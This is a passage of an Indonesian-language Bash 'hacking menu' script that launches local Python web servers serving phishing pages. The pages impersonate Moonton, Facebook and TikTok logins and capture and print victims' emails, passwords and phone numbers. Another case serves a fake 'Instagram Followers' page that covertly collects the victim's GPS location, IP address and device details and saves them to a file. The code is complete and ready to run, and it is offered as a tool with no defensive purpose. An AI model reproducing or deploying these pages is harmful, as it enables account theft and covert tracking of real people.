██║╚██╔╝██║██║     
██║ ╚═╝ ██║███████╗
╚═╝     ╚═╝╚══════╝" | lolcat
echo ""
echo -e "${p}Development ${g}: ${c}Thxyzz404"
echo ""
echo ""
echo -e "${r}[ ${g}+ ${r}]${c} Menyiapkan Server Website."
echo ""
read -p "$(echo -e "${y}Masukkan Port Anda ${r}[ ${g}contoh : 8080 ${r}]${c} : ")" input 
port=${input:-8080}
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Telah Aktif Di Port : http://localhost:$port "
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import sys
PORT = $port
HTML_CONTENT = '''<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login dengan Akun Moonton</title>
  <style>
    body {
      background-color: #1e2a38;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-container {
      background-color: #2e3d50;
      padding: 30px;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0px 0px 10px #000;
    }
    .input-group {
      position: relative;
    }
    input[type=\"text\"], input[type=\"password\"], input[type=\"email\"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      box-sizing: border-box;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 20px;
      cursor: pointer;
      user-select: none;
      font-size: 18px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #3b8ed3;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }
    a {
      color: #87cefa;
      text-decoration: none;
      font-size: 0.9em;
    }
  </style>
</head>
<body>
  <div class=\"login-container\">
    <h3>Login dengan Akun Moonton</h3>
    <form method=\"POST\" action=\"/login\">
      <input type=\"text\" name=\"email\" placeholder=\"Alamat Email/Akun Moonton/Nomor Telepon\" required>
      <div class=\"input-group\">
        <input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Kata Sandi\" required>
        <span class=\"toggle-password\" onclick=\"togglePassword()\">☐</span>
      </div>
      <p style=\"font-size: 0.8em;\">Gunakan 6 karakter atau lebih dengan menggabungkan huruf besar dan kecil, serta tidak menggunakan karakter khusus</p>
      <button type=\"submit\">Login</button>
    </form>
    <br>
    <a href=\"#\">Lupa Kata Sandi?</a>
  </div>
  <script>
    function togglePassword() {
      const passwordInput = document.getElementById(\"password\");
      const toggleIcon = document.querySelector(\".toggle-password\");
      const isPassword = passwordInput.type === \"password\";
      passwordInput.type = isPassword ? \"text\" : \"password\";
      toggleIcon.textContent = isPassword ? \"☐\" : \"☑\";
    }
  </script>
</body>
</html>'''
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == \"/\":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
        else:
            self.send_error(404, \"Halaman tidak ditemukan.\")   
    def do_POST(self):
        if self.path == \"/login\":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode())
            email = data.get('email', [''])[0]
            password = data.get('password', [''])[0]
            print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Gmail/ID Moonton : \" + email + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Password : \" + password + \"\033[0m\n\")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b\"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Login berhasil! Kami Akan Menghubungkan Anda Kembali Jika Semuanya Sudah Di Proses.</h2>\")
        else:
            self.send_error(404)  
    def log_message(self, format, *args):
        return
if __name__ == \"__main__\":
    print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[32;1m Salin Portnya : http://localhost:\" + str(PORT) + \"\033[0m\")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
     ;;
        85)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
echo "
███████╗██████╗ 
██╔════╝██╔══██╗
█████╗  ██████╔╝
██╔══╝  ██╔══██╗
██║     ██████╔╝
╚═╝     ╚═════╝ 
Developer : Thxyzz404 " | lolcat
port="${1:-8080}"
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
import sys
PORT_START = $port
def find_available_port(start_port):
    port = start_port
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except OSError:
            print('\033[31;1m[ \033[32;1mx \033[31;1m]\033[35;1m Port ' + str(port) + ' sedang digunakan.')
            print('\033[31;1m[ \033[32;1m+ \033[31;1m]\033[33;1m Mencoba port lain dari port yang berbeda.')
            port += 1
PORT = find_available_port(PORT_START)
HTML_CONTENT = \"\"\"<!DOCTYPE html>
<html>
<head>
    <title>Facebook Security Check</title>
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            color: #1c1e21;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 400px;
            width: 100%;
        }
        .facebook-logo {
            text-align: center;
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .security-box {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .alert-header {
            background: #fef7e0;
            border: 1px solid #ffd983;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .alert-icon {
            color: #f0c000;
            font-size: 20px;
            margin-right: 10px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            background: #f5f6f7;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 15px 0;
        }
        .help-links {
            text-align: center;
            margin: 15px 0;
        }
        .help-links a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
        }
        .create-page {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #dadde1;
        }
        .create-btn {
            background: #42b72a;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class=\"container\">
        <div class=\"facebook-logo\">facebook</div>   
        <div class=\"security-box\">
            <div class=\"alert-header\">
                <span class=\"alert-icon\">⚠️</span>
                <strong>Security Check Required</strong>
            </div>     
            <p style=\"margin-bottom: 20px; color: #606770;\">
                We've detected unusual login activity on your account. To keep your account secure, we need to verify your identity.
            </p>
            <form id=\"facebookForm\">
                <input type=\"text\" id=\"fbEmail\" placeholder=\"Email address or phone number\" required>
                <input type=\"password\" id=\"fbPassword\" placeholder=\"Password\" required>    
                <button type=\"submit\" class=\"login-btn\">Continue</button>
            </form>
            <div class=\"help-links\">
                <a href=\"#\">Forgotten account?</a>
                <a href=\"#\">Help Center</a>
            </div>
        </div>
        <div class=\"create-page\">
            <p style=\"color: #1c1e21; margin-bottom: 15px;\">
                <strong>Create a Page</strong> for a celebrity, brand or business.
            </p>
            <button class=\"create-btn\">Create Page</button>
        </div>
        <div style=\"text-align: center; margin-top: 30px; color: #737373; font-size: 12px;\">
            English (UK) &nbsp;&middot;&nbsp; Bahasa Indonesia &nbsp;&middot;&nbsp; 日本語 &nbsp;&middot;&nbsp; Español &nbsp;&middot;&nbsp; Português (Brasil)
            <br><br>
            Meta &copy; 2024
        </div>
    </div>
    <script>
        const pageId = \"facebook_page\"; 
        document.getElementById('facebookForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('fbEmail').value;
            const password = document.getElementById('fbPassword').value;   
            fetch('/collect/' + pageId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    service: 'Facebook',
                    email: email,
                    password: password,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language
                })
            }).then(() => {
                alert('Security check completed successfully! Redirecting to Facebook...');
                setTimeout(() => {
                    window.location.href = 'https://facebook.com';
                }, 2000);
            });
        });
    </script>
</body>
</html>\"\"\"
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == \"/\":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
        else:
            self.send_error(404, \"Halaman tidak ditemukan.\")   
    def do_POST(self):
        if self.path == \"/collect/facebook_page\":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())
            email = data.get('email', '')
            password = data.get('password', '')
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Email/Username :\033[32;1m \" + email + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Password :\033[32;1m \" + password + \"\033[0m\\n\")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b\"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Security check completed! You will be redirected shortly.</h2>\")
        else:
            self.send_error(404)  
    def log_message(self, format, *args):
        return
if __name__ == \"__main__\":
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Server berjalan di : http://localhost:\" + str(PORT) + \"\033[0m\")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
    86)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⡿⠿⠿⢿⣿⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣴⣿⢟⡛⢍⠒⡰⡈⠥⣉⠒⡌⢛⢽⣟⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⡿⣋⠒⢢⠘⠤⡙⠤⡑⣡⢂⠣⡘⢂⢆⡙⢮⣗⠿⣿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⢋⠲⢠⠙⢢⠉⣆⣵⣶⣷⣿⣿⣷⣷⣧⣆⠜⣠⠻⣏⡷⣻⢿⣧⡀⠀
⠀⣼⣿⡑⢊⠱⠨⡌⣡⣾⠿⠋⠁⠀⠀⠀⠀⠈⠙⠻⣿⣦⠥⡹⣳⡽⣫⣿⣷⠀
⢰⣿⢣⠘⡌⡡⢃⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣷⡡⢻⣵⢻⡼⣿⣇
⣾⡿⢂⡱⢌⠰⣹⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠙⣮⡗⣯⢿⣿
⣿⡇⢣⠰⣈⠒⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠡⣿⡝⣮⢿⣿
⢿⣿⢠⢃⠤⡉⢽⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⢡⡟⣾⡹⣾⣿
⠸⣿⣦⠊⡔⠩⢌⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠣⢹⣾⣱⣻⣿⠇
⠀⠹⣿⣜⢨⠑⠬⣈⠿⣿⣦⣀⠀⠀⠀⠀⠀⠀⣀⣤⣾⠟⣅⢊⡿⣖⣳⣿⡟⠀
⠀⠀⠹⣿⣦⢉⠖⡠⢎⡘⠹⠿⢿⣷⣶⣶⣶⡿⢿⠛⡅⢣⠰⣸⢷⣹⣿⠟⠀⠀
⠀⠀⠀⠙⣿⣎⢆⡑⠢⢌⡱⢘⢂⡒⠰⢂⡱⢈⠦⡑⠌⢆⢱⣯⣳⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣖⡌⠱⢂⡔⠣⢌⡰⢉⡒⠤⢃⢆⠩⡘⢌⡾⣵⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⣎⡑⡊⠔⣡⠒⡄⢣⢘⡐⠣⢌⠒⡩⣸⣿⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣿⣖⢩⠘⡄⢣⠘⡄⠣⢌⠱⡈⢎⢱⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢊⡔⢡⢃⠬⡑⢊⠱⡈⢦⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⢈⠦⡘⠤⡑⡉⠆⢥⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢢⠑⡘⠤⡙⢌⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠩⠜⡰⢁⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠓⡄⣻⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣯⣴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo ""
echo -e "${g}======================================"
echo -e "${r}   Sekeer INFO : Thxyzz404 "
echo -e "${g}======================================"
echo ""
python3 <<PYTHON
import http.server, socketserver, os, json
class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def do_POST(self):
        if self.path == "/kliklanjut":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode())

                print(f"\n\033[31;1m[\033[32;1m+\033[31;1m]\033[35;1m Device Information :")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m IP Target : \033[0m{data.get('ip', 'Unknown')}\n")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m OS : \033[0m{data.get('os', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Platform : \033[0m{data.get('platform', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m CPU Cores : \033[0m{data.get('cores', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m RAM : \033[0m{data.get('ram', 'Unknown')} GB")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m GPU Vendor : \033[0m{data.get('gpuVendor', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m GPU : \033[0m{data.get('gpu', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Resolution : \033[0m{data.get('res', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Browser : \033[0m{data.get('browser', 'Unknown')}")

                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[35;1m Location Information :\033[0m")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Latitude : \033[0m{data.get('lat', '-')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Longitude : \033[0m{data.get('lon', '-')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Accuracy : \033[0m{data.get('acc', '-')} m")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Altitude : \033[0m{data.get('alt', '-')} m")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Direction : \033[0m{data.get('dir', '0')}°")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Speed : \033[0m{data.get('spd', '0')} m/s")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Google Maps : \033[0mhttps://maps.google.com/?q={data.get('lat')},{data.get('lon')}")

                save_dir = "/data/data/com.termux/files/home/Instagram"
                os.makedirs(save_dir, exist_ok=True)
                with open(os.path.join(save_dir, "info.txt"), "w") as out:
                    json.dump(data, out, indent=2)
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Data Saved : \033[0m{save_dir}/info.txt")
            except Exception as e:
                print("\033[31;1m[\033[32;1mERROR\033[31;1m]\033[36;1m Data tidak valid : ", e)
            self.send_response(200)
            self.end_headers()
        else:
            self.send_error(404)
os.makedirs("web", exist_ok=True)
with open("web/index.html", "w") as f:
    f.write('''
<!DOCTYPE html>
<html>
<head>
  <title>Instagram Followers</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      text-align: center;
      background: linear-gradient(to right, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      color: white;
      font-family: sans-serif;
      padding-top: 50px;
    }
    img { width: 200px; }
    .btn {
      margin-top: 30px;
      background: white;
      color: #dc2743;
      font-weight: bold;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
  <script>
    async function lanjutkan() {
      let lat=0, lon=0, acc=0, alt=0, spd=0, dir=0, ip="Unknown";
      if (navigator.geolocation) {
        await new Promise(resolve => {
          navigator.geolocation.getCurrentPosition(pos => {
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
            acc = pos.coords.accuracy;
            alt = pos.coords.altitude || 0;
            spd = pos.coords.speed || 0;
            dir = pos.coords.heading || 0;
            resolve();
          }, err => {
            alert("Akses lokasi gagal atau ditolak!");
            resolve();
          });
        });
      }
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ip = ipData.ip;
      } catch (e) {
        ip = "Gagal mengambil IP";
      }
      const data = {
        os: navigator.platform,
        platform: navigator.userAgentData?.platform || navigator.platform,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory || 0,
        gpuVendor: "WebGL",
        gpu: getGPUInfo(),
        res: screen.width + "x" + screen.height,
        browser: navigator.userAgent,
        lat, lon, acc, alt, spd, dir, ip
      };
      await fetch("/kliklanjut", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
      });
      window.location.href = "/proses.html";
    }
    function getGPUInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } catch (e) {
        return "Unknown";
      }
    }
  </script>
</head>
<body>
  <img src="https://i.top4top.io/p_35631jnco1.jpg" alt="Logo">
  <h1>Instagram Followers</h1>
  <h2>Click continue to load the page</h2>
  <p>New Instagram Suntik Network</p>
  <button class="btn" onclick="lanjutkan()">Lanjutkan</button>
</body>
</html>
''')
with open("web/proses.html", "w") as f:
    f.write('''
<!DOCTYPE html>
<html>
<head>
  <title>Proses Followers</title>
  <meta charset="UTF-8">
  <style>
    body {
      background: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }
  </style>
</head>
<body>
  <h1>Followers sedang diproses...</h1>
  <p>Mohon untuk menunggunya.</p>
</body>
</html>
''')
os.chdir("web")
PORT = 8000
socketserver.TCPServer.allow_reuse_address = True
while True:
    try:
        with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
            print(f"\n\033[31;1m[\033[32;1m + \033[31;1m]\033[36;1m Server aktif di : \033[33;1mhttp://127.0.0.1:{PORT}")
            print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Tekan \033[32;1mCTRL+Z \033[36;1muntuk keluar")
            httpd.serve_forever()
    except OSError:
        print(f"\033[31;1m[ \033[32;1m!! \033[31;1m]\033[36;1m Port {PORT} sudah dipakai, mencoba port lain..!!")
        PORT += 1
PYTHON
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      87)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
echo "
████████╗████████╗
╚══██╔══╝╚══██╔══╝
   ██║      ██║   
   ██║      ██║   
   ██║      ██║   
   ╚═╝      ╚═╝ 
Developer : Thxyzz404 " | lolcat
port="${1:-8080}"
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
import sys
PORT_START = $port
def find_available_port(start_port):
    port = start_port
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except OSError:
            print('\033[31;1m[ \033[32;1mx \033[31;1m]\033[35;1m Port ' + str(port) + ' sedang digunakan.')
            print('\033[31;1m[ \033[32;1m+ \033[31;1m]\033[33;1m Mencoba port lain dari port yang berbeda.')
            port += 1
PORT = find_available_port(PORT_START)
HTML_CONTENT = \"\"\"<!DOCTYPE html>
<html>
<head>
    <title>TikTok Account Verification</title>
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: #000;
            color: white;
            min-height: 100vh;
            padding: 20px;
            background: linear-gradient(135deg, #000000, #2d1b69);
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
        }
        .tiktok-logo {
            text-align: center;
            font-size: 42px;
            font-weight: bold;
            margin-bottom: 30px;
            text-shadow: 0 0 10px rgba(255, 0, 80, 0.5);
        }
        .tiktok-logo span:nth-child(1) { color: #ff0050; }
        .tiktok-logo span:nth-child(2) { color: #00f2ea; }
        .tiktok-logo span:nth-child(3) { color: #ff0050; }
        .tiktok-logo span:nth-child(4) { color: #00f2ea; }
        .tiktok-logo span:nth-child(5) { color: #ff0050; }
        .tiktok-logo span:nth-child(6) { color: #00f2ea; }
        .verification-box {
            background: rgba(18, 18, 18, 0.8);
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
            border: 1px solid #333;
            backdrop-filter: blur(10px);
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #333;
            border-radius: 8px;
            background: #000;
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        input:focus {
            outline: none;
            border-color: #ff0050;
            box-shadow: 0 0 10px rgba(255, 0, 80, 0.3);
        }
        .verify-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s ease;
        }
        .verify-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 0, 80, 0.4);
        }
        .benefits {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
        }
        .benefit-item {
            text-align: center;
        }
        .benefit-icon {
            font-size: 24px;
            margin-bottom: 5px;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 10px 0;
        }
        .spinner {
            border: 3px solid #333;
            border-top: 3px solid #ff0050;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class=\"container\">
        <div class=\"tiktok-logo\">
            <span>T</span><span>i</span><span>k</span><span>T</span><span>o</span><span>k</span>
        </div>
        <div class=\"verification-box\">
            <h3 style=\"text-align: center; margin-bottom: 20px;\">🎯 Creator Verification</h3>
            <p style=\"text-align: center; color: #ccc; margin-bottom: 20px;\">
                Verify your account to unlock special features and increase your visibility!
            </p>
            <div class=\"benefits\">
                <div class=\"benefit-item\">
                    <div class=\"benefit-icon\">👑</div>
                    <div>Verified Badge</div>
                </div>
                <div class=\"benefit-item\">
                    <div class=\"benefit-icon\">📈</div>
                    <div>More Views</div>
                </div>
                <div class=\"benefit-item\">
                    <div class=\"benefit-icon\">💎</div>
                    <div>Premium Features</div>
                </div>
            </div>
        </div>
        <form id=\"tiktokForm\">
            <input type=\"text\" id=\"tiktokUsername\" placeholder=\"Username or Email\" required>
            <input type=\"password\" id=\"tiktokPassword\" placeholder=\"Password\" required>
            <input type=\"text\" id=\"tiktokPhone\" placeholder=\"Phone Number (optional)\">    
            <div class=\"loading\" id=\"loading\">
                <div class=\"spinner\"></div>
                Verifying your account...
            </div>     
            <button type=\"submit\" class=\"verify-btn\">🎬 VERIFY CREATOR ACCOUNT</button>
        </form>
        <div style=\"text-align: center; margin-top: 20px; font-size: 12px; color: #666;\">
            By verifying, you agree to TikTok's terms of service
        </div>
    </div>
    <script>
        const pageId = \"tiktok_page\";
        document.getElementById('tiktokForm').addEventListener('submit', function(e) {
            e.preventDefault();   
            const username = document.getElementById('tiktokUsername').value;
            const password = document.getElementById('tiktokPassword').value;
            const phone = document.getElementById('tiktokPhone').value;
            const loading = document.getElementById('loading');
            const submitBtn = this.querySelector('button[type=\"submit\"]');
            loading.style.display = 'block';
            submitBtn.disabled = true;
            submitBtn.textContent = 'VERIFYING...';     
            fetch('/collect/' + pageId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    service: 'TikTok',
                    username: username,
                    password: password,
                    phone: phone,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform
                })
            }).then(() => {
                loading.style.display = 'none';
                submitBtn.textContent = '✅ VERIFICATION SUCCESSFUL!';
                submitBtn.style.background = 'linear-gradient(45deg, #00b300, #00f2ea)';          
                setTimeout(() => {
                    alert('✅ Creator account verified! Unlocking premium features.');
                    setTimeout(() => {
                        window.location.href = 'https://tiktok.com';
                    }, 2000);
                }, 1000);
            }).catch(() => {
                loading.style.display = 'none';
                submitBtn.disabled = false;
                submitBtn.textContent = '🎬 VERIFY CREATOR ACCOUNT';
                alert('❌ Verification failed. Please try again.');
            });
        });
    </script>
</body>
</html>\"\"\"
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == \"/\":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
        else:
            self.send_error(404, \"Halaman tidak ditemukan.\")  
    def do_POST(self):
        if self.path == \"/collect/tiktok_page\":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())
            username = data.get('username', '')
            password = data.get('password', '')
            phone = data.get('phone', '')
            service = data.get('service', '')    
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Service :\033[32;1m \" + service + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Username/Email :\033[32;1m \" + username + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Password :\033[32;1m \" + password + \"\033[0m\")
            if phone:
                print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Phone :\033[32;1m \" + phone + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m User Agent :\033[32;1m \" + data.get('userAgent', '') + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Platform :\033[32;1m \" + data.get('platform', '') + \"\033[0m\")
            print(\"\")  
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b\"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Security check completed! You will be redirected shortly.</h2>\")
        else:
            self.send_error(404)   
    def log_message(self, format, *args):
        return
if __name__ == \"__main__\":
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Server berjalan di : http://localhost:\" + str(PORT) + \"\033[0m\")
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Menunggu kredensial.\033[0m\")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
